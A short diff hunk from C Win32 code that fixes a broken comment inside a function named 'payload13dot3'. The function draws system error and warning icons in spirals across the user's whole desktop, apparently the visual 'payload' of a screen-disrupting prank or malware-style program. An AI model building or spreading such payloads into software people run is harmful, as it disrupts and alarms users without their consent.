@@ -409,7 +409,7 @@ DWORD WINAPI payload13dot3(LPVOID lpParam) {
         desk = GetDC(0);
         int radius = 10, rx = rand() % sw, ry = rand() % sh, num = rand() % 5;
         for (int t = 0; t < sw + sh; ++t) {
-            int x = (int)(float)(radius + t * tan(t + radius * 3) + rx), /eeeeeeeeeeeeeeee
+            int x = (int)(float)(radius + t * tan(t + radius * 3) + rx), //eeeeeeeeeeeeeeee
                 y = (int)(float)(radius + t * cos(t + radius * 3) + ry);
             if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }
             if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_WARNING)); Sleep(0.99); }
